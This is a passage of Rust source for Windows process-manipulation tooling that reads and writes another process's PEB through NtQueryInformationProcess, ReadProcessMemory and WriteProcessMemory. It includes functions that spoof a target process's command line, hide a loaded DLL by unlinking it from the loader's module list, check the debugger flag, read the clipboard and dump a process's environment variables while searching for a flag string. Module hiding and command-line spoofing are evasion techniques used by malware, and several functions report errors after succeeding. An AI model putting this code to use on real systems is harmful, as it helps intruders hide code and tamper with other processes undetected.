    use winapi::um::wlanapi::WlanCloseHandle;
    use winapi::um::wlanapi::WlanEnumInterfaces;
    use winapi::um::wlanapi::WlanFreeMemory;
    use winapi::um::wlanapi::WlanGetAvailableNetworkList;
    use winapi::um::wlanapi::WlanGetProfile;
    use winapi::um::wlanapi::WlanOpenHandle;
    use winapi::shared::winerror::*;

    pub fn writeprocessparameters(prochandle: *mut c_void, newargs: String) -> Result<String,String>{
        unsafe{

            let mut buffer:Vec<u8> = vec![0;1024];
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();

            let mut requiredlength = 0;
            let ntstatus = NtQueryInformationProcess(prochandle,
                 0,
                  buffer.as_mut_ptr() as *mut c_void, 
                  std::mem::size_of_val(&pbi) as u32, 
                &mut requiredlength);
            println!("required length: {}",requiredlength);

            if !NT_SUCCESS(ntstatus){
                if ntstatus!=STATUS_INFO_LENGTH_MISMATCH{
                    return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                    //std::process::exit(0);
                }
            }

            let mut buffer:Vec<u8> = vec![0;requiredlength as usize];
            let ntstatus = NtQueryInformationProcess(prochandle,
                0,
                 buffer.as_mut_ptr() as *mut c_void, 
                 buffer.len() as u32, 
               &mut requiredlength);

            if !NT_SUCCESS(ntstatus){
                return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                //std::process::exit(0);
            }

            let mut pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);

            //println!("{:x?}",pbi.PebBaseAddress);
            
            let mut peb = std::mem::zeroed::<PEB>();
            let mut pebbuffer:Vec<u8> = vec![0;std::mem::size_of::<PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                pbi.PebBaseAddress as *const c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len(), &mut bytesread );

            peb = *(pebbuffer.as_mut_ptr() as *mut PEB);
            

            let mut rtlprocessparameters = std::mem::zeroed::<RTL_USER_PROCESS_PARAMETERS>();
            FillStructureFromMemory(&mut rtlprocessparameters, peb.ProcessParameters as *mut c_void, prochandle);

            let mut cmdline:Vec<u16> = vec![0;10240];
            let mut byteswritten = 0;

            let mut newbuffer = newargs.encode_utf16().collect::<Vec<u16>>();
            newbuffer.push(0);
            let mut us = std::mem::zeroed::<UNICODE_STRING>();
            us.Length = newbuffer.len() as u16;
            us.MaximumLength = (newbuffer.len() * 2) as u16;
            //us.Buffer = newbuffer.as_mut_ptr() as *mut u16;

            let memberptr = std::ptr::addr_of!(rtlprocessparameters.CommandLine) as *const u8;

            let offset1 = (memberptr).offset_from(&rtlprocessparameters as *const _ as *const u8) as usize;
            println!("offset: {}",offset1);

            let mut nullbuffer:Vec<u8> = vec![0;rtlprocessparameters.CommandLine.MaximumLength as usize];
            WriteProcessMemory(prochandle, 
                rtlprocessparameters.CommandLine.Buffer as *mut c_void, 
               nullbuffer.as_ptr() as *const c_void , 
               rtlprocessparameters.CommandLine.MaximumLength as usize, 
                &mut byteswritten);


                
            WriteProcessMemory(prochandle, 
                ((&mut rtlprocessparameters as *mut _ as *mut u8 as usize) + offset1) as *mut c_void, 
               u16::to_ne_bytes(us.Length).as_ptr() as *const c_void , 
               2, 
                &mut byteswritten);

            /*WriteProcessMemory(prochandle, 
                    ((&mut rtlprocessparameters as *mut _ as *mut u8 as usize) + offset1+2) as *mut c_void, 
                   u16::to_ne_bytes(us.MaximumLength).as_ptr() as *const c_void , 
                   2, 
                    &mut byteswritten);*/
            
             WriteProcessMemory(prochandle, 
                rtlprocessparameters.CommandLine.Buffer as *mut c_void, 
               newbuffer.as_ptr() as *const c_void , 
               (newbuffer.len()*2), 
                &mut byteswritten);

            
            /*WriteProcessMemory(prochandle, 
                    (rtlprocessparameters.CommandLine.Buffer as usize-2) as *mut c_void, 
                   u16::to_ne_bytes(us.MaximumLength).as_ptr() as *mut c_void , 
                   2, 
                    &mut byteswritten);

            WriteProcessMemory(prochandle, 
                    (rtlprocessparameters.CommandLine.Buffer as usize-4) as *mut c_void, 
                   u16::to_ne_bytes(us.Length).as_ptr() as *mut c_void , 
                   2, 
                        &mut byteswritten);*/
            

            return Err("Something went wrong".to_string());

        }
    }

    pub fn isbeingdebugged(prochandle: *mut c_void) -> Result<u8,String>{

        unsafe{

            let mut buffer:Vec<u8> = vec![0;1024];
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();

            let mut requiredlength = 0;
            let ntstatus = NtQueryInformationProcess(prochandle,
                 0,
                  buffer.as_mut_ptr() as *mut c_void, 
                  std::mem::size_of_val(&pbi) as u32, 
                &mut requiredlength);
            //println!("required length: {}",requiredlength);


            


            if !NT_SUCCESS(ntstatus){
                if ntstatus!=STATUS_INFO_LENGTH_MISMATCH{
                    return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                    //std::process::exit(0);
                }
            }

            let mut buffer:Vec<u8> = vec![0;requiredlength as usize];
            let ntstatus = NtQueryInformationProcess(prochandle,
                0,
                 buffer.as_mut_ptr() as *mut c_void, 
                 buffer.len() as u32, 
               &mut requiredlength);

            if !NT_SUCCESS(ntstatus){
                return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                //std::process::exit(0);
            }

            let mut pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);

            //println!("{:x?}",pbi.PebBaseAddress);
            
            let mut peb = std::mem::zeroed::<PEB>();
            let mut pebbuffer:Vec<u8> = vec![0;std::mem::size_of::<PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                pbi.PebBaseAddress as *const c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len(), &mut bytesread );

            peb = *(pebbuffer.as_mut_ptr() as *mut PEB);
            return Ok(peb.BeingDebugged);
            

        }
    }

    pub fn getloadedmodules(prochandle: *mut c_void) -> Result<HashMap<String,u64>,String>{

        unsafe{

            //let mut allmodules:Vec<HashMap<String,u64>> = Vec::new();
            let mut h1:HashMap<String,u64> = HashMap::new();

            let mut buffer:Vec<u8> = vec![0;1024];
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();

            let mut requiredlength = 0;
            let ntstatus = NtQueryInformationProcess(prochandle,
                 0,
                  buffer.as_mut_ptr() as *mut c_void, 
                  std::mem::size_of_val(&pbi) as u32, 
                &mut requiredlength);
            //println!("required length: {}",requiredlength);


            


            if !NT_SUCCESS(ntstatus){
                if ntstatus!=STATUS_INFO_LENGTH_MISMATCH{
                    return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                    //std::process::exit(0);
                }
            }

            let mut buffer:Vec<u8> = vec![0;requiredlength as usize];
            let ntstatus = NtQueryInformationProcess(prochandle,
                0,
                 buffer.as_mut_ptr() as *mut c_void, 
                 buffer.len() as u32, 
               &mut requiredlength);

            if !NT_SUCCESS(ntstatus){
                return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                //std::process::exit(0);
            }

            let mut pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);

            //println!("{:x?}",pbi.PebBaseAddress);
            
            let mut peb = std::mem::zeroed::<PEB>();
            let mut pebbuffer:Vec<u8> = vec![0;std::mem::size_of::<PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                pbi.PebBaseAddress as *const c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len(), &mut bytesread );

            peb = *(pebbuffer.as_mut_ptr() as *mut PEB);
            let mut pebldrdata = std::mem::zeroed::<PEB_LDR_DATA>();
            FillStructureFromMemory(&mut pebldrdata, peb.Ldr as *const c_void, prochandle);

            //println!("pebldrdata length: {:x?}",pebldrdata.Length);
            //println!("pebldrdata inloadorder: {:x?}",pebldrdata.InLoadOrderModuleList.Flink);
            

            let mut temp = pebldrdata.InLoadOrderModuleList.Flink;
         
                
            loop{

            let mut tableentry = std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>();
            FillStructureFromMemory(&mut tableentry, temp as *const c_void, prochandle);

        

            //println!("tableentry inloadmodule flink: {:x?}",tableentry.InLoadOrderLinks.Flink);
            //println!("tableentry inmemoryorder blink: {:x?}",tableentry.InMemoryOrderLinks.Flink);
            let mut dllnamebuffer:Vec<u16> = vec![0;1024];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                tableentry.BaseDllName.Buffer as *const c_void, 
                dllnamebuffer.as_mut_ptr() as *mut c_void, 
                tableentry.BaseDllName.Length as usize, &mut bytesread);
            
            let modulename = String::from_utf16_lossy(&dllnamebuffer);
    
            h1.insert(modulename.trim_end_matches("\0").to_string(), tableentry.DllBase as u64);
            
            //println!("{} at {:x?}",modulename,tableentry.DllBase);

            temp = tableentry.InLoadOrderLinks.Flink;

            if temp==pebldrdata.InLoadOrderModuleList.Flink{
                break;
            }
            
            }

            
            return Ok(h1);

        }

    }


    pub fn getloadedmodulesbackward(prochandle: *mut c_void) -> Result<HashMap<String,u64>,String>{

        unsafe{

            //let mut allmodules:Vec<HashMap<String,u64>> = Vec::new();
            let mut h1:HashMap<String,u64> = HashMap::new();

            let mut buffer:Vec<u8> = vec![0;1024];
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();

            let mut requiredlength = 0;
            let ntstatus = NtQueryInformationProcess(prochandle,
                 0,
                  buffer.as_mut_ptr() as *mut c_void, 
                  std::mem::size_of_val(&pbi) as u32, 
                &mut requiredlength);
            //println!("required length: {}",requiredlength);


            


            if !NT_SUCCESS(ntstatus){
                if ntstatus!=STATUS_INFO_LENGTH_MISMATCH{
                    return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                    //std::process::exit(0);
                }
            }

            let mut buffer:Vec<u8> = vec![0;requiredlength as usize];
            let ntstatus = NtQueryInformationProcess(prochandle,
                0,
                 buffer.as_mut_ptr() as *mut c_void, 
                 buffer.len() as u32, 
               &mut requiredlength);

            if !NT_SUCCESS(ntstatus){
                return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                //std::process::exit(0);
            }

            let mut pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);

            //println!("{:x?}",pbi.PebBaseAddress);
            
            let mut peb = std::mem::zeroed::<PEB>();
            let mut pebbuffer:Vec<u8> = vec![0;std::mem::size_of::<PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                pbi.PebBaseAddress as *const c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len(), &mut bytesread );

            peb = *(pebbuffer.as_mut_ptr() as *mut PEB);
            let mut pebldrdata = std::mem::zeroed::<PEB_LDR_DATA>();
            FillStructureFromMemory(&mut pebldrdata, peb.Ldr as *const c_void, prochandle);

            //println!("pebldrdata length: {:x?}",pebldrdata.Length);
            //println!("pebldrdata inloadorder: {:x?}",pebldrdata.InLoadOrderModuleList.Flink);
            

            let mut temp = pebldrdata.InLoadOrderModuleList.Blink;
         
                
            loop{

            let mut tableentry = std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>();
            FillStructureFromMemory(&mut tableentry, temp as *const c_void, prochandle);

        

            //println!("tableentry inloadmodule flink: {:x?}",tableentry.InLoadOrderLinks.Flink);
            //println!("tableentry inmemoryorder blink: {:x?}",tableentry.InMemoryOrderLinks.Flink);
            let mut dllnamebuffer:Vec<u16> = vec![0;1024];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                tableentry.BaseDllName.Buffer as *const c_void, 
                dllnamebuffer.as_mut_ptr() as *mut c_void, 
                tableentry.BaseDllName.Length as usize, &mut bytesread);
            
            let modulename = String::from_utf16_lossy(&dllnamebuffer);
    
            h1.insert(modulename.trim_end_matches("\0").to_string(), tableentry.DllBase as u64);
            
            //println!("{} at {:x?}",modulename,tableentry.DllBase);

            temp = tableentry.InLoadOrderLinks.Blink;

            if temp==pebldrdata.InLoadOrderModuleList.Blink{
                break;
            }
            
            }

            
            return Ok(h1);

        }

    }



    pub fn hideloadedmodule(prochandle: *mut c_void, modulename:String) -> Result<String,String>{
        unsafe{

            let allmodules = getloadedmodules(prochandle).unwrap();
            for i in allmodules.keys(){
                if &modulename!=i{
                    // return Err("module not found in the list".to_string());
                }
            }

            let mut buffer:Vec<u8> = vec![0;1024];
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();

            let mut requiredlength = 0;
            let ntstatus = NtQueryInformationProcess(prochandle,
                 0,
                  buffer.as_mut_ptr() as *mut c_void, 
                  std::mem::size_of_val(&pbi) as u32, 
                &mut requiredlength);
            //println!("required length: {}",requiredlength);


            if !NT_SUCCESS(ntstatus){
                if ntstatus!=STATUS_INFO_LENGTH_MISMATCH{
                    return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                    //std::process::exit(0);
                }
            }

            let mut buffer:Vec<u8> = vec![0;requiredlength as usize];
            let ntstatus = NtQueryInformationProcess(prochandle,
                0,
                 buffer.as_mut_ptr() as *mut c_void, 
                 buffer.len() as u32, 
               &mut requiredlength);

            if !NT_SUCCESS(ntstatus){
                return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                //std::process::exit(0);
            }

            let mut pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);

            //println!("{:x?}",pbi.PebBaseAddress);
            
            let mut peb = std::mem::zeroed::<PEB>();
            let mut pebbuffer:Vec<u8> = vec![0;std::mem::size_of::<PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                pbi.PebBaseAddress as *const c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len(), &mut bytesread );

            peb = *(pebbuffer.as_mut_ptr() as *mut PEB);

            let mut pebldrdata = std::mem::zeroed::<PEB_LDR_DATA>();
            FillStructureFromMemory(&mut pebldrdata, peb.Ldr as *const c_void, prochandle);

            let mut firstflink = pebldrdata.InLoadOrderModuleList.Flink;
            let mut firstblink = pebldrdata.InLoadOrderModuleList.Blink;
            

            let mut temp = pebldrdata.InLoadOrderModuleList.Flink;

            let mut tableentryprevious = std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>();

            // if the first forward link is the modulename
            let mut tableentry = std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>();
            FillStructureFromMemory(&mut tableentry, firstflink as *const c_void, prochandle);
            let mut dllname:Vec<u16> = vec![0;tableentry.BaseDllName.MaximumLength as usize];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                    tableentry.BaseDllName.Buffer as *const c_void, 
                    dllname.as_mut_ptr() as *mut c_void, 
                    tableentry.BaseDllName.Length as usize, 
                    &mut bytesread);

            let basedllname2 = String::from_utf16_lossy(&dllname).trim_end_matches("\0").to_string();
            if basedllname2.to_lowercase()==modulename.to_lowercase(){
                let newflink = (tableentry.InLoadOrderLinks.Flink as usize).to_ne_bytes();
                let mut byteswritten = 0;
                WriteProcessMemory(prochandle, 
                            tableentry.InLoadOrderLinks.Blink as *mut c_void, 
                            newflink.as_ptr() as *const c_void, 
                            newflink.len(), &mut byteswritten);
                        

                let mut nexttableentry = std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>();
                FillStructureFromMemory(&mut nexttableentry, tableentry.InLoadOrderLinks.Flink as *const c_void, prochandle);
                let newflink = (tableentry.InLoadOrderLinks.Blink as usize).to_ne_bytes();
                let mut byteswritten = 0;
                WriteProcessMemory(prochandle, 
                            (tableentry.InLoadOrderLinks.Flink as usize + 8) as *mut c_void, 
                            newflink.as_ptr() as *const c_void, 
                            newflink.len(), &mut byteswritten);
                
                return Ok("Successfully hid the module".to_string());
            }

            


            // if the first backward link is the modulename
            let mut tableentry = std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>();
            FillStructureFromMemory(&mut tableentry, firstblink as *const c_void, prochandle);
            let mut dllname:Vec<u16> = vec![0;tableentry.BaseDllName.MaximumLength as usize];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                    tableentry.BaseDllName.Buffer as *const c_void, 
                    dllname.as_mut_ptr() as *mut c_void, 
                    tableentry.BaseDllName.Length as usize, 
                    &mut bytesread);

            let basedllname2 = String::from_utf16_lossy(&dllname).trim_end_matches("\0").to_string();
            if basedllname2.to_lowercase()==modulename.to_lowercase(){
                let newflink = (tableentry.InLoadOrderLinks.Flink as usize).to_ne_bytes();
                let mut byteswritten = 0;
                WriteProcessMemory(prochandle, 
                            tableentry.InLoadOrderLinks.Blink as *mut c_void, 
                            newflink.as_ptr() as *const c_void, 
                            newflink.len(), &mut byteswritten);
                        

                let mut prevtableentry = std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>();
                FillStructureFromMemory(&mut prevtableentry, tableentry.InLoadOrderLinks.Blink as *const c_void, prochandle);
                let newflink = (tableentry.InLoadOrderLinks.Blink as usize).to_ne_bytes();
                let mut byteswritten = 0;
                WriteProcessMemory(prochandle, 
                            (tableentry.InLoadOrderLinks.Flink as usize + 8) as *mut c_void, 
                            newflink.as_ptr() as *const c_void, 
                            newflink.len(), &mut byteswritten);
                
                return Ok("Successfully hid the module".to_string());
            }




            let mut temp = pebldrdata.InLoadOrderModuleList.Flink;
            let mut firstflink = pebldrdata.InLoadOrderModuleList.Flink;
            let mut firstblink = pebldrdata.InLoadOrderModuleList.Blink;
            
            //let mut dllnames:Vec<String> = Vec::new();
            //dllnames.push(basedllname2);

            // modulename is somewhere other than first or last. in between first and last.
            loop{

                let mut tableentry = std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>();
                FillStructureFromMemory(&mut tableentry, temp as *const c_void, prochandle);

                let mut dllname:Vec<u16> = vec![0;tableentry.BaseDllName.MaximumLength as usize];
                let mut bytesread = 0;
                ReadProcessMemory(prochandle, 
                    tableentry.BaseDllName.Buffer as *const c_void, 
                    dllname.as_mut_ptr() as *mut c_void, 
                    tableentry.BaseDllName.Length as usize, 
                    &mut bytesread);

                let basedllname = String::from_utf16_lossy(&dllname).trim_end_matches("\0").to_string();
                //println!("{}",basedllname);
                
                
                if basedllname.to_lowercase()==modulename.to_lowercase(){
                    println!("modulename: {}",modulename);
                    if !tableentryprevious.InLoadOrderLinks.Flink.is_null(){
                        let newflink = (tableentry.InLoadOrderLinks.Flink as usize).to_ne_bytes();
                        let mut byteswritten = 0;
                        WriteProcessMemory(prochandle, 
                            tableentry.InLoadOrderLinks.Blink as *mut c_void, 
                            newflink.as_ptr() as *const c_void, 
                            newflink.len(), &mut byteswritten);
                        

                        let mut nexttableentry = std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>();
                        FillStructureFromMemory(&mut nexttableentry, tableentry.InLoadOrderLinks.Flink as *const c_void, prochandle);
                        let newflink = (tableentry.InLoadOrderLinks.Blink as usize).to_ne_bytes();
                        let mut byteswritten = 0;
                        WriteProcessMemory(prochandle, 
                            (tableentry.InLoadOrderLinks.Flink as usize + 8) as *mut c_void, 
                            newflink.as_ptr() as *const c_void, 
                            newflink.len(), &mut byteswritten);


                    }
                }


                temp = tableentry.InLoadOrderLinks.Flink;
                tableentryprevious = tableentry;
                /*for i in 0..dllnames.len(){
                    if dllnames[i]==basedllname{
                        break;
                    }
                    
                    dllnames.push(basedllname.clone());
                    
                }*/
                if temp == firstflink{
                    break;
                }

            }


            return Ok("Successfully hid the module".to_string());
        }

    }


    pub fn getprocessimagepath(prochandle: *mut c_void) -> Result<String,String> {
        unsafe{

            let mut buffer:Vec<u8> = vec![0;1024];
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();

            let mut requiredlength = 0;
            let ntstatus = NtQueryInformationProcess(prochandle,
                 0,
                  buffer.as_mut_ptr() as *mut c_void, 
                  std::mem::size_of_val(&pbi) as u32, 
                &mut requiredlength);
            //println!("required length: {}",requiredlength);


            if !NT_SUCCESS(ntstatus){
                if ntstatus!=STATUS_INFO_LENGTH_MISMATCH{
                    return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                    //std::process::exit(0);
                }
            }

            let mut buffer:Vec<u8> = vec![0;requiredlength as usize];
            let ntstatus = NtQueryInformationProcess(prochandle,
                0,
                 buffer.as_mut_ptr() as *mut c_void, 
                 buffer.len() as u32, 
               &mut requiredlength);

            if !NT_SUCCESS(ntstatus){
                return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                //std::process::exit(0);
            }

            let mut pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);

            //println!("{:x?}",pbi.PebBaseAddress);
            
            let mut peb = std::mem::zeroed::<PEB>();
            let mut pebbuffer:Vec<u8> = vec![0;std::mem::size_of::<PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                pbi.PebBaseAddress as *const c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len(), &mut bytesread );


            peb = *(pebbuffer.as_mut_ptr() as *mut PEB);
            let mut rtlprocessparameters = std::mem::zeroed::<RTL_USER_PROCESS_PARAMETERS>();
            FillStructureFromMemory(&mut rtlprocessparameters, peb.ProcessParameters as *mut c_void, prochandle);

            let mut imagepathnamebuffer:Vec<u16> = vec![0;1024];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                rtlprocessparameters.ImagePathName.Buffer as *const c_void, 
                imagepathnamebuffer.as_mut_ptr() as *mut c_void, 
                rtlprocessparameters.ImagePathName.Length as usize, &mut bytesread);

            let imagepathname = String::from_utf16_lossy(&imagepathnamebuffer[..]);
            

            return Ok(imagepathname.trim_end_matches("\0").to_string());
        }
    }


    pub fn getprocessparameters(prochandle: *mut c_void) -> Result<String,String>{
        unsafe{

            let mut buffer:Vec<u8> = vec![0;1024];
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();

            let mut requiredlength = 0;
            let ntstatus = NtQueryInformationProcess(prochandle,
                 0,
                  buffer.as_mut_ptr() as *mut c_void, 
                  std::mem::size_of_val(&pbi) as u32, 
                &mut requiredlength);
            //println!("required length: {}",requiredlength);

            if !NT_SUCCESS(ntstatus){
                if ntstatus!=STATUS_INFO_LENGTH_MISMATCH{
                    return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                    //std::process::exit(0);
                }
            }

            let mut buffer:Vec<u8> = vec![0;requiredlength as usize];
            let ntstatus = NtQueryInformationProcess(prochandle,
                0,
                 buffer.as_mut_ptr() as *mut c_void, 
                 buffer.len() as u32, 
               &mut requiredlength);

            if !NT_SUCCESS(ntstatus){
                return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                //std::process::exit(0);
            }

            let mut pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);

            //println!("{:x?}",pbi.PebBaseAddress);
            
            let mut peb = std::mem::zeroed::<PEB>();
            let mut pebbuffer:Vec<u8> = vec![0;std::mem::size_of::<PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                pbi.PebBaseAddress as *const c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len(), &mut bytesread );

            peb = *(pebbuffer.as_mut_ptr() as *mut PEB);
            

            let mut rtlprocessparameters = std::mem::zeroed::<RTL_USER_PROCESS_PARAMETERS>();
            FillStructureFromMemory(&mut rtlprocessparameters, peb.ProcessParameters as *mut c_void, prochandle);

            let mut cmdline:Vec<u16> = vec![0;10240];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                rtlprocessparameters.CommandLine.Buffer as *const c_void, 
                cmdline.as_mut_ptr() as *mut c_void, 
                rtlprocessparameters.CommandLine.Length as usize, 
                &mut bytesread);

            
            let params = String::from_utf16_lossy(&cmdline);


            return Ok(params.trim_end_matches("\0").to_string());

        }
    }


    pub fn isprotectedprocess(prochandle: *mut c_void) -> Result<String,String> {
        unsafe{

            let mut buffer:Vec<u8> = vec![0;1024];
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();

            let mut requiredlength = 0;
            let ntstatus = NtQueryInformationProcess(prochandle,
                 0,
                  buffer.as_mut_ptr() as *mut c_void, 
                  std::mem::size_of_val(&pbi) as u32, 
                &mut requiredlength);
            //println!("required length: {}",requiredlength);

            if !NT_SUCCESS(ntstatus){
                if ntstatus!=STATUS_INFO_LENGTH_MISMATCH{
                    return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                    //std::process::exit(0);
                }
            }

            let mut buffer:Vec<u8> = vec![0;requiredlength as usize];
            let ntstatus = NtQueryInformationProcess(prochandle,
                0,
                 buffer.as_mut_ptr() as *mut c_void, 
                 buffer.len() as u32, 
               &mut requiredlength);

            if !NT_SUCCESS(ntstatus){
                return Err(format!("NtQueryInformationProcess failed nterror: {:x?}",ntstatus));
                //std::process::exit(0);
            }

            let mut pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);

            //println!("{:x?}",pbi.PebBaseAddress);
            
            let mut peb = std::mem::zeroed::<PEB>();
            let mut pebbuffer:Vec<u8> = vec![0;std::mem::size_of::<PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                pbi.PebBaseAddress as *const c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len(), &mut bytesread );

            peb = *(pebbuffer.as_mut_ptr() as *mut PEB);
            
            println!("{}",(peb.BitField&2));
            

            return Ok("".to_string());
        }
    }


    pub fn getclipboarddata() -> Result<String,String>{

        unsafe{

            let res = OpenClipboard(std::ptr::null_mut());
            if res==0{
                return Err(format!("OpenClipboard failed: {}",GetLastError()));
            }

            
            let cliphandle = GetClipboardData(CF_TEXT);
            if cliphandle.is_null(){
                return Err(format!("GetClipboardData failed: {}",GetLastError()));
            }

            
            let contents = ReadStringFromMemory(GetCurrentProcess(), cliphandle);
            //println!("clipboard data: {}",contents);
            CloseClipboard();
            return Ok(contents);
        }

            return Err("unknown error".to_string());
        
    }


    pub fn setclipboarddata(mut text: String) -> Result<String,String>{
        unsafe{

            let res = OpenClipboard(std::ptr::null_mut());
            if res==0{
                return Err(format!("OpenClipboard failed: {}",GetLastError()));
            }

            let mut finaltext = (text.clone() + "\0");
            let datahandle = SetClipboardData(CF_TEXT, finaltext.as_bytes_mut().as_mut_ptr() as *mut c_void);
            if datahandle.is_null(){
                return Err(format!("setclipboarddata failed: {}",GetLastError()));
            }
            CloseClipboard();
            return Err("Something gone wrong".to_string());
        
        }
    }

    pub fn getenvironmentvariables(prochandle: *mut c_void) -> Result<String, String>{
        unsafe{

            let mut buffer:Vec<u8> = vec![0;10240];
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();

            let mut requiredlength = 0;
            let ntstatus = NtQueryInformationProcess(prochandle, 0, 
               buffer.as_mut_ptr() as *mut c_void , 
               std::mem::size_of_val(&pbi) as u32,
                &mut requiredlength );

            //println!("required length: {}",requiredlength);

            if !NT_SUCCESS(ntstatus){
                if ntstatus!=STATUS_INFO_LENGTH_MISMATCH{
                    return Err(format!("NtQueryInformation  process 1 failed: {:x?}",ntstatus));
                }
            }


            let mut buffer:Vec<u8> = vec![0;requiredlength as usize];
            let ntstatus = NtQueryInformationProcess(prochandle, 0, 
                buffer.as_mut_ptr() as *mut c_void , 
                std::mem::size_of_val(&pbi) as u32,
                 &mut requiredlength );

            if !NT_SUCCESS(ntstatus) {
                return Err(format!("NtQueryInformation process failed: {:x?}",ntstatus));
            }
            
            FillStructureFromArray(&mut pbi, &buffer);


            //println!("peb: {:x?}",pbi.PebBaseAddress);

            let mut peb = std::mem::zeroed::<PEB>();
            FillStructureFromMemory(&mut peb, pbi.PebBaseAddress as *const c_void, prochandle);

            let mut rtlparams = std::mem::zeroed::<RTL_USER_PROCESS_PARAMETERS>();
            FillStructureFromMemory(&mut rtlparams, peb.ProcessParameters as *const c_void, prochandle);

            let t = ReadStringFromMemory(prochandle, rtlparams.Environment);
            //println!("env var1: {}",t);

            let mut mbi = std::mem::zeroed::<MEMORY_BASIC_INFORMATION>();
            let mut mbibuffer:Vec<u8> = vec![0;std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as usize];
            let res = VirtualQueryEx(prochandle, rtlparams.Environment, 
                &mut mbi,
                 std::mem::size_of::<MEMORY_BASIC_INFORMATION>() );

            //println!("res: {}",res);
            if res==0{
                println!("virtualqueryex failed: {}",GetLastError());
            }
            
            //mbi = *(mbibuffer.as_mut_ptr() as *mut MEMORY_BASIC_INFORMATION);
            
            /*println!("baseaddress: {:x?}",mbi.BaseAddress);
            println!("environmentptr: {:x?}",rtlparams.Environment);
            println!("regionsize: {:x?}",mbi.RegionSize);
            println!("{:x?}",mbi.AllocationProtect);*/

            let mut env:Vec<u16> = vec![0;512];
            let mut envvar:Vec<u16> = Vec::new();
            let mut vars:Vec<String> = Vec::new();
            let mut bytesread = 0;
            let mut k =0;

            loop{


            let res = ReadProcessMemory(prochandle, 
                (rtlparams.Environment as usize + (k*1024)) as *const c_void, 
                env.as_mut_ptr() as *mut c_void, 
                1024, &mut bytesread);

            k+=1;
            if env[0..5] == [0u16;5]{
                break;
            }

            
            for i in 0..env.len(){
                if env[i]==0{
                    if env[i]==0 && env[i+1]==0{
                        break;
                    }
                    let s = String::from_utf16_lossy(&envvar);
                    //println!("{}",s);
                    vars.push(s);
                    envvar.clear();
                    continue;
                }
                envvar.push(env[i]);

            }


            
        }
            
            println!("{:?}",vars);
            for i in vars{
                if i.contains("MALEFICENT_FLAG"){
                    println!("{}",i);
                }
            }
            
            //println!("{:x?}",env);
            //println!("{}",String::from_utf16_lossy(&envvar));

            /*let envlength = mbi.RegionSize - (rtlparams.Environment as usize - mbi.BaseAddress as usize);
            println!("length of env block: {:x?}",envlength);

